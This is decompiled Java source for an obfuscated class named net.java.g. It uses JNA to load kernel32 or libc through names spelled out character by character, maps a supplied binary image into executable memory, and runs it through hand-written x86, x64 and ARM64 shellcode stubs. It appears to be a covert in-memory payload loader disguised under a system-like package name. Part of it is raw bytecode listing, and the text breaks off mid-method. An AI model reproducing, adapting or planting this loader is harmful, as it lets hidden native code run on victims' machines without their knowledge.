package net.java;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;
import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Random;

public class g {
  private static Object a;

  private static Function a;

  private static Function b;

  private static Function c;

  private static int a = 1;

  private static int b = 2;

  private static int c = 4;

  private static int d = 32;

  private static int e = 2;

  private static int f = 'က';

  private static int g = 2;

  private static Object b;

  private static Function d;

  private static Function e;

  private static Function f;

  private static boolean b() {
    try {
      StringBuilder stringBuilder;
      (stringBuilder = new StringBuilder()).append('c');
      stringBuilder.append('o');
      stringBuilder.append('m');
      stringBuilder.append('.');
      stringBuilder.append('s');
      stringBuilder.append('u');
      stringBuilder.append('n');
      stringBuilder.append('.');
      stringBuilder.append('j');
      stringBuilder.append('n');
      stringBuilder.append('a');
      stringBuilder.append('.');
      stringBuilder.append('N');
      stringBuilder.append('a');
      stringBuilder.append('t');
      stringBuilder.append('i');
      stringBuilder.append('v');
      stringBuilder.append('e');
      g.class.getClassLoader().loadClass(stringBuilder.toString());
      return true;
    } catch (Throwable throwable) {
      return false;
    }
  }

  private static void a(byte[] paramArrayOfbyte, int paramInt1, int paramInt2) {
    paramArrayOfbyte[paramInt1 + 3] = (byte)(paramInt2 >>> 24);
    paramArrayOfbyte[paramInt1 + 2] = (byte)(paramInt2 >>> 16);
    paramArrayOfbyte[paramInt1 + 1] = (byte)(paramInt2 >>> 8);
    paramArrayOfbyte[paramInt1] = (byte)paramInt2;
  }

  private static void a(byte[] paramArrayOfbyte, int paramInt, long paramLong) {
    paramArrayOfbyte[paramInt + 7] = (byte)(int)(paramLong >>> 56L);
    paramArrayOfbyte[paramInt + 6] = (byte)(int)(paramLong >>> 48L);
    paramArrayOfbyte[paramInt + 5] = (byte)(int)(paramLong >>> 40L);
    paramArrayOfbyte[paramInt + 4] = (byte)(int)(paramLong >>> 32L);
    paramArrayOfbyte[paramInt + 3] = (byte)(int)(paramLong >>> 24L);
    paramArrayOfbyte[paramInt + 2] = (byte)(int)(paramLong >>> 16L);
    paramArrayOfbyte[paramInt + 1] = (byte)(int)(paramLong >>> 8L);
    paramArrayOfbyte[paramInt] = (byte)(int)paramLong;
  }

  private static long a(byte[] paramArrayOfbyte, int paramInt) {
    return 0x0L | (paramArrayOfbyte[paramInt + 7] & 0xFF) << 56L | (paramArrayOfbyte[paramInt + 6] & 0xFF) << 48L | (paramArrayOfbyte[paramInt + 5] & 0xFF) << 40L | (paramArrayOfbyte[paramInt + 4] & 0xFF) << 32L | (paramArrayOfbyte[paramInt + 3] & 0xFF) << 24L | ((paramArrayOfbyte[paramInt + 2] & 0xFF) << 16) | ((paramArrayOfbyte[paramInt + 1] & 0xFF) << 8) | (paramArrayOfbyte[paramInt] & 0xFF);
  }

  private static int a(byte[] paramArrayOfbyte, int paramInt) {
    return 0x0 | (paramArrayOfbyte[paramInt + 3] & 0xFF) << 24 | (paramArrayOfbyte[paramInt + 2] & 0xFF) << 16 | (paramArrayOfbyte[paramInt + 1] & 0xFF) << 8 | paramArrayOfbyte[paramInt] & 0xFF;
  }

  private static int b(byte[] paramArrayOfbyte, int paramInt) {
    long l3;
    if (paramInt < 0)
      return 0;
    long l1 = 0L;
    boolean bool = false;
    long l2 = 0L;
    for (byte b = 0; b < paramInt; b++) {
      if (bool) {
        if (paramArrayOfbyte[b] != 0) {
          bool = false;
          if ((b - 1) - l1 > 512L)
            l2 = l1;
        }
      } else if (paramArrayOfbyte[b] == 0) {
        l1 = b;
        bool = true;
      }
    }
    if (l.g()) {
      l3 = 16384L;
    } else {
      l3 = 4096L;
    }
    long l4;
    if ((l4 = l2 / l3) * l3 < l2)
      l4++;
    return (int)(l4 * l3);
  }

  private static boolean a(byte[] paramArrayOfbyte) {
    byte[] arrayOfByte = { -1, -18, -35, -52, -69, -86, -103, -120 };
    int i = l.a(paramArrayOfbyte, arrayOfByte);
    for (byte b = 0; b < 8; b++)
      arrayOfByte[b] = 0;
    return !(i > 0 && i < 2048);
  }

  private static int a(byte[] paramArrayOfbyte) {
    byte[] arrayOfByte1 = { -35, -52, -69, -86 };
    byte[] arrayOfByte2 = { -1, -18, -35, -52, -69, -86, -103, -120 };
    try {
      byte b;
      boolean bool;
      long l1;
      long l2;
      long l6;
      int i;
      if ((i = l.a(new Object[] { paramArrayOfbyte, Integer.valueOf(2048), arrayOfByte2 })) < 0) {
        if ((i = l.a(new Object[] { paramArrayOfbyte, Integer.valueOf(2048), arrayOfByte1 })) < 0)
          return -1;
        b = 20;
        bool = true;
      } else {
        b = 40;
        bool = false;
      }
      if (bool) {
        l1 = a(paramArrayOfbyte, i + 4);
        l2 = a(paramArrayOfbyte, i + 8);
      } else {
        l1 = a(paramArrayOfbyte, i + 8);
        l2 = a(paramArrayOfbyte, i + 16);
      }
      long l3 = l1 + l2;
      long l4 = (i + b);
      long l5 = i + b + l3;
      if (l1 > 0L)
        return -2;
      if (bool) {
        l6 = a(paramArrayOfbyte, (int)(l4 - 4L)) + l5 - l2;
      } else {
        l6 = a(paramArrayOfbyte, (int)(l4 - 8L)) + l5 - l2;
      }
      return (int)l6;
    } finally {
      byte b;
      for (b = 0; b < 8; b++)
        arrayOfByte2[b] = 0;
      for (b = 0; b < 4; b++)
        arrayOfByte1[b] = 0;
    }
  }

  private static int a(Object paramObject1, Object paramObject2) {
    paramObject1 = paramObject1;
    paramObject2 = paramObject2;
    long l1 = 0L;
    long l2 = 0L;
    long l3 = 0L;
    try {
      int i;
      if ((i = b((byte[])paramObject1, paramObject1.length - 4096)) == 0) {
        if (0L != 0L)
          a(0L, 0L);
        return 206;
      }
      while (true) {
        if (l1 >= (paramObject1.length + ((paramObject2 == null) ? 0 : paramObject2.length))) {
          long l7 = 0L;
          long l8;
          for (l8 = l1; l7 < i; l8 -= 4096L)
            l7 += 4096L;
          l1 += 16384L;
          long l4;
          if ((l4 = a(new Object[] { Long.valueOf(0L), Long.valueOf(l1), Integer.valueOf(8192), Integer.valueOf(4) })) == 0L) {
            if (l4 != 0L)
              a(l4, l1);
            return 207;
          }
          long l5;
          if ((l5 = a(new Object[] { Long.valueOf(l4), Long.valueOf(l7), Integer.valueOf(4096), Integer.valueOf(4) })) == 0L) {
            if (l4 != 0L)
              a(l4, l1);
            return 208;
          }
          long l6;
          if ((l6 = a(new Object[] { Long.valueOf(l4 + l7), Long.valueOf(l8), Integer.valueOf(4096), Integer.valueOf(4) })) == 0L) {
            if (l4 != 0L)
              a(l4, l1);
            return 209;
          }
          if (l6 != l4 + l7) {
            if (l4 != 0L)
              a(l4, l1);
            return 210;
          }
          a(l4, (byte[])paramObject1, paramObject1.length);
          if (paramObject2 != null)
            a(l4 + paramObject1.length, (byte[])paramObject2, paramObject2.length);
          if (a(new Object[] { Long.valueOf(l5), Long.valueOf(l7), Integer.valueOf(32) }) != Boolean.TRUE) {
            if (l4 != 0L)
              a(l4, l1);
            return 211;
          }
          int j;
          if ((j = a((byte[])paramObject1)) == -1) {
            if (l4 != 0L)
              a(l4, l1);
            return 212;
          }
          if (j == -2) {
            if (l4 != 0L)
              a(l4, l1);
            return 213;
          }
          byte[] arrayOfByte1 = {
              -13, 15, 30, -6, 83, 87, 86, 72, -119, -53,
              72, -125, -20, 32, 72, -117, 123, 8, 72, -117,
              115, 16, 72, -117, 83, 24, 72, -117, 75, 32,
              -1, 19, 72, -119, 67, 40, 49, -64, 72, -125,
              -60, 32, 94, 95, 91, -61 };
          byte[] arrayOfByte2 = {
              85, -117, -20, 86, -117, 117, 8, -1, 118, 16,
              -1, 118, 12, -1, 118, 8, -1, 118, 4, -1,
              22, -125, -60, 16, -119, 70, 20, 51, -64, 94,
              93, -61 };
          byte[] arrayOfByte3 = {
              -13, 15, 31, -8, -2, 7, -7, -13, 3, -86,
              2, -116, 65, -87, 8, 64, -7, -124, 64, -87,
              1, 63, -42, 96, 22, -7, -32, 3, 31, -86,
              -2, 7, 64, -7, -13, 7, 65, -8, -64, 3,
              95, -42 };
          l2 = a(new Object[] { Long.valueOf(0L), Long.valueOf(4096L), Integer.valueOf(12288), Integer.valueOf(4) });
          if (l.g()) {
            a(l2, arrayOfByte3, 48);
          } else if (l.f()) {
            a(l2, arrayOfByte1, 46);
          } else if (l.e()) {
            a(l2, arrayOfByte2, 32);
          }
          a(new Object[] { Long.valueOf(l2), Long.valueOf(4096L), Integer.valueOf(32) });
          l3 = a(new Object[] { Long.valueOf(0L), Long.valueOf(4096L), Integer.valueOf(12288), Integer.valueOf(4) });
          arrayOfByte1 = new byte[48];
          boolean bool;
          if (bool = a((byte[])paramObject1)) {
            a(arrayOfByte1, 0, (int)(l4 + j));
            a(arrayOfByte1, 4, (int)(l4 + j));
            a(arrayOfByte1, 8, (int)l7);
          } else {
            a(arrayOfByte1, 0, l4 + j);
            a(arrayOfByte1, 8, l4 + j);
            a(arrayOfByte1, 16, l7);
          }
          a(l3, arrayOfByte1, 48);
          long l10 = l3;
          long l9 = l2;
          Pointer pointer;
          if ((pointer = Function.getFunction(new Pointer(l9)).invokePointer(new Object[] { new Pointer(l10) })) != null)
            Pointer.nativeValue(pointer);
          byte[] arrayOfByte4 = arrayOfByte1;
          l9 = l3;
          (new Pointer(l9)).read(0L, arrayOfByte4, 0, 48);
          if (bool)
            return a(arrayOfByte1, 20);
          return (int)a(arrayOfByte1, 40);
        }
        l1 += 4096L;
      }
    } finally {
      if (l3 != 0L)
        a(l3, 4096L);
      if (l2 != 0L)
        a(l2, 4096L);
    }
  }

  private static Object a() {
    if (a == null) {
      StringBuilder stringBuilder;
      (stringBuilder = new StringBuilder()).append('k');
      stringBuilder.append('e');
      stringBuilder.append('r');
      stringBuilder.append('n');
      stringBuilder.append('e');
      stringBuilder.append('l');
      stringBuilder.append('3');
      stringBuilder.append('2');
      a = NativeLibrary.getInstance(stringBuilder.toString());
    }
    return a;
  }

  private static void a(long paramLong, byte[] paramArrayOfbyte, int paramInt) {
    (new Pointer(paramLong)).write(0L, paramArrayOfbyte, 0, paramInt);
  }

  private static Object a(Object paramObject) {
    // Byte code:
    //   0: aload_0
    //   1: checkcast [Ljava/lang/Object;
    //   4: dup
    //   5: astore_0
    //   6: iconst_0
    //   7: aaload
    //   8: checkcast java/lang/Long
    //   11: invokevirtual longValue : ()J
    //   14: lstore_2
    //   15: aload_0
    //   16: iconst_1
    //   17: aaload
    //   18: checkcast java/lang/Long
    //   21: invokevirtual longValue : ()J
    //   24: lstore #4
    //   26: aload_0
    //   27: iconst_2
    //   28: aaload
    //   29: checkcast java/lang/Integer
    //   32: invokevirtual intValue : ()I
    //   35: istore_1
    //   36: aload_0
    //   37: iconst_3
    //   38: aaload
    //   39: checkcast [I
    //   42: astore_0
    //   43: getstatic net/java/g.a : Lcom/sun/jna/Function;
    //   46: ifnonnull -> 64
    //   49: invokestatic a : ()Ljava/lang/Object;
    //   52: checkcast com/sun/jna/NativeLibrary
    //   55: invokestatic b : ()Ljava/lang/String;
    //   58: invokevirtual getFunction : (Ljava/lang/String;)Lcom/sun/jna/Function;
    //   61: putstatic net/java/g.a : Lcom/sun/jna/Function;
    //   64: new com/sun/jna/Memory
    //   67: dup
    //   68: ldc2_w 4
    //   71: invokespecial <init> : (J)V
    //   74: astore #6
    //   76: getstatic net/java/g.a : Lcom/sun/jna/Function;
    //   79: iconst_4
    //   80: anewarray java/lang/Object
    //   83: dup
    //   84: iconst_0
    //   85: new com/sun/jna/Pointer
    //   88: dup
    //   89: lload_2
    //   90: invokespecial <init> : (J)V
    //   93: aastore
    //   94: dup
    //   95: iconst_1
    //   96: new com/sun/jna/Pointer
    //   99: dup
    //   100: lload #4
    //   102: invokespecial <init> : (J)V
    //   105: aastore
    //   106: dup
    //   107: iconst_2
    //   108: iload_1
    //   109: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   112: aastore
    //   113: dup
    //   114: iconst_3
    //   115: aload #6
    //   117: aastore
    //   118: invokevirtual invokePointer : ([Ljava/lang/Object;)Lcom/sun/jna/Pointer;
    //   121: astore_1
    //   122: aload_0
    //   123: ifnull -> 135
    //   126: aload_0
    //   127: iconst_0
    //   128: aload #6
    //   130: lconst_0
    //   131: invokevirtual getInt : (J)I
    //   134: iastore
    //   135: aload_1
    //   136: ifnonnull -> 143
    //   139: getstatic java/lang/Boolean.FALSE : Ljava/lang/Boolean;
    //   142: areturn
    //   143: aload_1
    //   144: invokestatic nativeValue : (Lcom/sun/jna/Pointer;)J
    //   147: lconst_1
    //   148: lcmp
    //   149: ifne -> 156
    //   152: getstatic java/lang/Boolean.TRUE : Ljava/lang/Boolean;
    //   155: areturn
    //   156: getstatic java/lang/Boolean.FALSE : Ljava/lang/Boolean;
    //   159: areturn
  }

  private static boolean a(long paramLong1, long paramLong2) {
    if (b == null)
      b = ((NativeLibrary)a()).getFunction(e());
    Pointer pointer;
    return ((pointer = b.invokePointer(new Object[] { new Pointer(paramLong1), new Pointer(paramLong2), Integer.valueOf(32768) })) == null) ? false : ((Pointer.nativeValue(pointer) == 1L));
  }

  private static long a(Object paramObject) {
    long l1 = ((Long)(paramObject = paramObject)[0]).longValue();
    long l2 = ((Long)paramObject[1]).longValue();
    int j = ((Integer)paramObject[2]).intValue();
    int i = ((Integer)paramObject[3]).intValue();
    if (c == null)
      c = ((NativeLibrary)a()).getFunction(c());
    return Pointer.nativeValue(c.invokePointer(new Object[] { new Pointer(l1), new Pointer(l2), Integer.valueOf(j), Integer.valueOf(i) }));
  }

  private static int b(Object paramObject1, Object paramObject2) {
    // Byte code:
    //   0: aload_0
    //   1: checkcast [B
    //   4: astore_0
    //   5: aload_1
    //   6: checkcast [B
    //   9: astore_1
    //   10: lconst_0
    //   11: lstore #8
    //   13: aload_0
    //   14: dup
    //   15: arraylength
    //   16: sipush #4096
    //   19: isub
    //   20: invokestatic b : ([BI)I
    //   23: dup
    //   24: istore_2
    //   25: ifne -> 52
    //   28: lconst_0
    //   29: lconst_0
    //   30: lcmp
    //   31: ifeq -> 40
    //   34: lconst_0
    //   35: lconst_0
    //   36: invokestatic a : (JJ)I
    //   39: pop
    //   40: sipush #206
    //   43: ireturn
    //   44: lload #8
    //   46: ldc2_w 4096
    //   49: ladd
    //   50: lstore #8
    //   52: lload #8
    //   54: aload_0
    //   55: arraylength
    //   56: aload_1
    //   57: ifnonnull -> 64
    //   60: iconst_0
    //   61: goto -> 66
    //   64: aload_1
    //   65: arraylength
    //   66: iadd
    //   67: i2l
    //   68: lcmp
    //   69: iflt -> 44
    //   72: lconst_0
    //   73: lstore #10
    //   75: goto -> 86
    //   78: lload #10
    //   80: ldc2_w 4096
    //   83: ladd
    //   84: lstore #10
    //   86: lload #10
    //   88: iload_2
    //   89: i2l
    //   90: lcmp
    //   91: iflt -> 78
    //   94: lload #8
    //   96: ldc2_w 16384
    //   99: ladd
    //   100: lstore #8
    //   102: bipush #6
    //   104: anewarray java/lang/Object
    //   107: dup
    //   108: iconst_0
    //   109: lconst_0
    //   110: invokestatic valueOf : (J)Ljava/lang/Long;
    //   113: aastore
    //   114: dup
    //   115: iconst_1
    //   116: lload #8
    //   118: invokestatic valueOf : (J)Ljava/lang/Long;
    //   121: aastore
    //   122: dup
    //   123: iconst_2
    //   124: getstatic net/java/g.a : I
    //   127: getstatic net/java/g.b : I
    //   130: ior
    //   131: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   134: aastore
    //   135: dup
    //   136: iconst_3
    //   137: getstatic net/java/g.d : I
    //   140: getstatic net/java/g.e : I
    //   143: ior
    //   144: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   147: aastore
    //   148: dup
    //   149: iconst_4
    //   150: iconst_m1
    //   151: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   154: aastore
    //   155: dup
    //   156: iconst_5
    //   157: iconst_0
    //   158: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   161: aastore
    //   162: checkcast [Ljava/lang/Object;
    //   165: dup
    //   166: astore #13
    //   168: iconst_0
    //   169: aaload
    //   170: checkcast java/lang/Long
    //   173: invokevirtual longValue : ()J
    //   176: lstore #14
    //   178: aload #13
    //   180: iconst_1
    //   181: aaload
    //   182: checkcast java/lang/Long
    //   185: invokevirtual longValue : ()J
    //   188: lstore #16
    //   190: aload #13
    //   192: iconst_2
    //   193: aaload
    //   194: checkcast java/lang/Integer
    //   197: invokevirtual intValue : ()I
    //   200: istore_2
    //   201: aload #13
    //   203: iconst_3
    //   204: aaload
    //   205: checkcast java/lang/Integer
    //   208: invokevirtual intValue : ()I
    //   211: istore_3
    //   212: aload #13
    //   214: iconst_4
    //   215: aaload
    //   216: checkcast java/lang/Integer
    //   219: invokevirtual intValue : ()I
    //   222: istore #6
    //   224: aload #13
    //   226: iconst_5
    //   227: aaload
    //   228: checkcast java/lang/Integer
    //   231: invokevirtual intValue : ()I
    //   234: istore #7
    //   236: getstatic net/java/g.f : Lcom/sun/jna/Function;
    //   239: ifnonnull -> 257
    //   242: invokestatic b : ()Ljava/lang/Object;
    //   245: checkcast com/sun/jna/NativeLibrary
    //   248: invokestatic h : ()Ljava/lang/String;
    //   251: invokevirtual getFunction : (Ljava/lang/String;)Lcom/sun/jna/Function;
    //   254: putstatic net/java/g.f : Lcom/sun/jna/Function;
    //   257: getstatic net/java/g.f : Lcom/sun/jna/Function;
    //   260: bipush #6
    //   262: anewarray java/lang/Object
    //   265: dup
    //   266: iconst_0
    //   267: new com/sun/jna/Pointer
    //   270: dup
    //   271: lload #14
    //   273: invokespecial <init> : (J)V
    //   276: aastore
    //   277: dup
    //   278: iconst_1
    //   279: new com/sun/jna/Pointer
    //   282: dup
    //   283: lload #16
    //   285: invokespecial <init> : (J)V
    //   288: aastore
    //   289: dup
    //   290: iconst_2
    //   291: iload_2
    //   292: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   295: aastore
    //   296: dup
    //   297: iconst_3
    //   298: iload_3
    //   299: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   302: aastore
    //   303: dup
    //   304: iconst_4
    //   305: iload #6
    //   307: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   310: aastore
    //   311: dup
    //   312: iconst_5
    //   313: new com/sun/jna/Pointer
    //   316: dup
    //   317: iload #7
    //   319: i2l
    //   320: invokespecial <init> : (J)V
    //   323: aastore
    //   324: invokevirtual invokePointer : ([Ljava/lang/Object;)Lcom/sun/jna/Pointer;
    //   327: dup
    //   328: astore_2
    //   329: ifnonnull -> 336
    //   332: lconst_0
    //   333: goto -> 340
    //   336: aload_2
    //   337: invokestatic nativeValue : (Lcom/sun/jna/Pointer;)J
    //   340: dup2
    //   341: lstore #4
    //   343: lconst_0
    //   344: lcmp
    //   345: ifne -> 367
    //   348: lload #4
    //   350: lconst_0
    //   351: lcmp
    //   352: ifeq -> 363
    //   355: lload #4
    //   357: lload #8
    //   359: invokestatic a : (JJ)I
    //   362: pop
    //   363: sipush #207
    //   366: ireturn
    //   367: lload #4
    //   369: lstore #6
    //   371: lload #4
    //   373: aload_0
    //   374: dup
    //   375: arraylength
    //   376: invokestatic a : (J[BI)V
    //   379: aload_1
    //   380: ifnull -> 395
    //   383: lload #4
    //   385: aload_0
    //   386: arraylength
    //   387: i2l
    //   388: ladd
    //   389: aload_1
    //   390: dup
    //   391: arraylength
    //   392: invokestatic a : (J[BI)V
    //   395: lload #6
    //   397: lload #10
    //   399: getstatic net/java/g.a : I
    //   402: getstatic net/java/g.c : I
    //   405: ior
    //   406: istore #16
    //   408: lstore #14
    //   410: lstore #12
    //   412: getstatic net/java/g.d : Lcom/sun/jna/Function;
    //   415: ifnonnull -> 433
    //   418: invokestatic b : ()Ljava/lang/Object;
    //   421: checkcast com/sun/jna/NativeLibrary
    //   424: invokestatic g : ()Ljava/lang/String;
    //   427: invokevirtual getFunction : (Ljava/lang/String;)Lcom/sun/jna/Function;
    //   430: putstatic net/java/g.d : Lcom/sun/jna/Function;
    //   433: getstatic net/java/g.d : Lcom/sun/jna/Function;
    //   436: iconst_3
    //   437: anewarray java/lang/Object
    //   440: dup
    //   441: iconst_0
    //   442: new com/sun/jna/Pointer
    //   445: dup
    //   446: lload #12
    //   448: invokespecial <init> : (J)V
    //   451: aastore
    //   452: dup
    //   453: iconst_1
    //   454: new com/sun/jna/Pointer
    //   457: dup
    //   458: lload #14
    //   460: invokespecial <init> : (J)V
    //   463: aastore
    //   464: dup
    //   465: iconst_2
    //   466: iload #16
    //   468: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   471: aastore
    //   472: invokevirtual invokePointer : ([Ljava/lang/Object;)Lcom/sun/jna/Pointer;
    //   475: dup
    //   476: astore #17
    //   478: ifnonnull -> 485
    //   481: iconst_0
    //   482: goto -> 491
    //   485: aload #17
    //   487: invokestatic nativeValue : (Lcom/sun/jna/Pointer;)J
    //   490: l2i
    //   491: ifeq -> 513
    //   494: lload #4
    //   496: lconst_0
    //   497: lcmp
    //   498: ifeq -> 509
    //   501: lload #4
    //   503: lload #8
    //   505: invokestatic a : (JJ)I
    //   508: pop
    //   509: sipush #211
    //   512: ireturn
    //   513: aload_0
    //   514: invokestatic a : ([B)I
    //   517: dup
    //   518: istore_0
    //   519: iconst_m1
    //   520: if_icmpne -> 542
    //   523: lload #4
    //   525: lconst_0
    //   526: lcmp
    //   527: ifeq -> 538
    //   530: lload #4
    //   532: lload #8
    //   534: invokestatic a : (JJ)I
    //   537: pop
    //   538: sipush #212
    //   541: ireturn
    //   542: iload_0
    //   543: bipush #-2
    //   545: if_icmpne -> 567
    //   548: lload #4
    //   550: lconst_0
    //   551: lcmp
    //   552: ifeq -> 563
    //   555: lload #4
    //   557: lload #8
    //   559: invokestatic a : (JJ)I
    //   562: pop
    //   563: sipush #213
    //   566: ireturn
    //   567: iconst_3
    //   568: anewarray java/lang/Object
    //   571: dup
    //   572: iconst_0
    //   573: lload #4
    //   575: iload_0
    //   576: i2l
    //   577: ladd
    //   578: invokestatic valueOf : (J)Ljava/lang/Long;
    //   581: aastore
    //   582: dup
    //   583: iconst_1
    //   584: lload #4
    //   586: iload_0
    //   587: i2l
    //   588: ladd
    //   589: invokestatic valueOf : (J)Ljava/lang/Long;
    //   592: aastore
    //   593: dup
    //   594: iconst_2
    //   595: lload #10
    //   597: invokestatic valueOf : (J)Ljava/lang/Long;
    //   600: aastore
    //   601: invokestatic b : (Ljava/lang/Object;)Ljava/lang/Object;
    //   604: checkcast java/lang/Number
    //   607: invokevirtual intValue : ()I
    //   610: istore_0
    //   611: iload_0
    //   612: ireturn
    //   613: athrow
    // Exception table:
    //   from	to	target	type
    //   13	28	613	finally
    //   44	348	613	finally
    //   367	494	613	finally
    //   513	523	613	finally
    //   567	611	613	finally
  }

  private static Object b() {
    if (b == null)
      try {
        StringBuilder stringBuilder;
        (stringBuilder = new StringBuilder()).append('l');
        stringBuilder.append('i');
        stringBuilder.append('b');
        stringBuilder.append('c');
        b = NativeLibrary.getInstance(stringBuilder.toString());
      } catch (Throwable throwable) {
        try {
          StringBuilder stringBuilder;
          (stringBuilder = new StringBuilder()).append('l');
          stringBuilder.append('i');
          stringBuilder.append('b');
          stringBuilder.append('c');
          stringBuilder.append('.');
          stringBuilder.append('s');
          stringBuilder.append('o');
          stringBuilder.append('.');
          stringBuilder.append('6');
          b = NativeLibrary.getInstance(stringBuilder.toString());
        } catch (Throwable throwable1) {
          StringBuilder stringBuilder;
          (stringBuilder = new StringBuilder()).append('l');
          stringBuilder.append('i');
          stringBuilder.append('b');
          stringBuilder.append('c');
          stringBuilder.append('.');
          stringBuilder.append('s');
          stringBuilder.append('o');
          b = NativeLibrary.getInstance(stringBuilder.toString());
        }
      }
    return b;
  }

  private static int a(long paramLong1, long paramLong2) {
    if (e == null)
      e = ((NativeLibrary)b()).getFunction(f());
    Pointer pointer;
    return ((pointer = e.invokePointer(new Object[] { new Pointer(paramLong1), new Pointer(paramLong2) })) == null) ? 0 : (int)Pointer.nativeValue(pointer);
  }

  private static Object b(Object paramObject) {
    long l1 = ((Long)(paramObject = paramObject)[0]).longValue();
    long l2 = ((Long)paramObject[1]).longValue();
    long l3 = ((Long)paramObject[2]).longValue();
    return ((paramObject = Function.getFunction(new Pointer(l1)).invokePointer(new Object[] { new Pointer(l2), new Pointer(l3), new Pointer(0L), new Pointer(0L) })) == null) ? Integer.valueOf(0) : Long.valueOf(Pointer.nativeValue((Pointer)paramObject));
  }

  private static int c(Object paramObject1, Object paramObject2) {
    // Byte code:
    //   0: aload_0
    //   1: checkcast [B
    //   4: astore_0
    //   5: aload_1
    //   6: checkcast [B
    //   9: astore_1
    //   10: lconst_0
    //   11: lstore #8
    //   13: aload_0
    //   14: dup
    //   15: arraylength
    //   16: sipush #4096
    //   19: isub
    //   20: invokestatic b : ([BI)I
    //   23: dup
    //   24: istore_2
    //   25: ifne -> 52
    //   28: lconst_0
    //   29: lconst_0
    //   30: lcmp
    //   31: ifeq -> 40
    //   34: lconst_0
    //   35: lconst_0
    //   36: invokestatic b : (JJ)I
    //   39: pop
    //   40: sipush #206
    //   43: ireturn
    //   44: lload #8
    //   46: ldc2_w 4096
    //   49: ladd
    //   50: lstore #8
    //   52: lload #8
    //   54: aload_0
    //   55: arraylength
    //   56: aload_1
    //   57: ifnonnull -> 64
    //   60: iconst_0
    //   61: goto -> 66
    //   64: aload_1
    //   65: arraylength
    //   66: iadd
    //   67: i2l
    //   68: lcmp
    //   69: iflt -> 44
    //   72: lconst_0
    //   73: lstore #10
    //   75: goto -> 86
    //   78: lload #10
    //   80: ldc2_w 4096
    //   83: ladd
    //   84: lstore #10
    //   86: lload #10
    //   88: iload_2
    //   89: i2l
    //   90: lcmp
    //   91: iflt -> 78
    //   94: lload #8
    //   96: ldc2_w 16384
    //   99: ladd
    //   100: lstore #8
    //   102: bipush #6
    //   104: anewarray java/lang/Object
    //   107: dup
    //   108: iconst_0
    //   109: lconst_0
    //   110: invokestatic valueOf : (J)Ljava/lang/Long;
    //   113: aastore
    //   114: dup
    //   115: iconst_1
    //   116: lload #8
    //   118: invokestatic valueOf : (J)Ljava/lang/Long;
    //   121: aastore
    //   122: dup
    //   123: iconst_2
    //   124: getstatic net/java/g.a : I
    //   127: getstatic net/java/g.b : I
    //   130: ior
    //   131: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   134: aastore
    //   135: dup
    //   136: iconst_3
    //   137: getstatic net/java/g.f : I
    //   140: getstatic net/java/g.g : I
    //   143: ior
    //   144: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   147: aastore
    //   148: dup
    //   149: iconst_4
    //   150: iconst_m1
    //   151: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   154: aastore
    //   155: dup
    //   156: iconst_5
    //   157: iconst_0
    //   158: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   161: aastore
    //   162: checkcast [Ljava/lang/Object;
    //   165: dup
    //   166: astore #13
    //   168: iconst_0
    //   169: aaload
    //   170: checkcast java/lang/Long
    //   173: invokevirtual longValue : ()J
    //   176: lstore #14
    //   178: aload #13
    //   180: iconst_1
    //   181: aaload
    //   182: checkcast java/lang/Long
    //   185: invokevirtual longValue : ()J
    //   188: lstore #16
    //   190: aload #13
    //   192: iconst_2
    //   193: aaload
    //   194: checkcast java/lang/Integer
    //   197: invokevirtual intValue : ()I
    //   200: istore_2
    //   201: aload #13
    //   203: iconst_3
    //   204: aaload
    //   205: checkcast java/lang/Integer
    //   208: invokevirtual intValue : ()I
    //   211: istore_3
    //   212: aload #13
    //   214: iconst_4
    //   215: aaload
    //   216: checkcast java/lang/Integer
    //   219: invokevirtual intValue : ()I
    //   222: istore #6
    //   224: aload #13
    //   226: iconst_5
    //   227: aaload
    //   228: checkcast java/lang/Integer
    //   231: invokevirtual intValue : ()I
    //   234: istore #7
    //   236: getstatic net/java/g.f : Lcom/sun/jna/Function;
    //   239: ifnonnull -> 254
    //   242: invokestatic h : ()Ljava/lang/String;
    //   245: invokestatic a : (Ljava/lang/String;)Ljava/lang/Object;
    //   248: checkcast com/sun/jna/Function
    //   251: putstatic net/java/g.f : Lcom/sun/jna/Function;
    //   254: getstatic net/java/g.f : Lcom/sun/jna/Function;
    //   257: bipush #6
    //   259: anewarray java/lang/Object
    //   262: dup
    //   263: iconst_0
    //   264: new com/sun/jna/Pointer
    //   267: dup
    //   268: lload #14
    //   270: invokespecial <init> : (J)V
    //   273: aastore
    //   274: dup
    //   275: iconst_1
    //   276: new com/sun/jna/Pointer
    //   279: dup
    //   280: lload #16
    //   282: invokespecial <init> : (J)V
    //   285: aastore
    //   286: dup
    //   287: iconst_2
    //   288: iload_2
    //   289: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   292: aastore
    //   293: dup
    //   294: iconst_3
    //   295: iload_3
    //   296: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   299: aastore
    //   300: dup
    //   301: iconst_4
    //   302: iload #6
    //   304: invokestatic valueOf : (I)Ljava/lang/Integer;
    //   307: aastore
    //   308: dup
    //   309: iconst_5
    //   310: new com/sun/jna/Pointer
    //   313: dup
    //   314: iload #7
    //   316: i2l
    //   317: invokespecial <init> : (J)V
    //   320: aastore
    //   321: invokevirtual invokePointer : ([Ljava/lang/Object;)Lcom/sun/jna/Pointer;
    //   324: astore_2
    //   325: lconst_0
    //   326: lstore #18
    //   328: aload_2
    //   329: ifnull -> 338
    //   332: aload_2
    //   333: invokestatic nativeValue : (Lcom/sun/jna/Pointer;)J
    //   336: lstore #18
    //   338: lload #18
    //   340: dup2
    //   341: lstore #4
    //   343: lconst_0
    //   344: lcmp
    //   345: ifne -> 367
    //   348: lload #4
    //   350: lconst_0
    //   351: lcmp
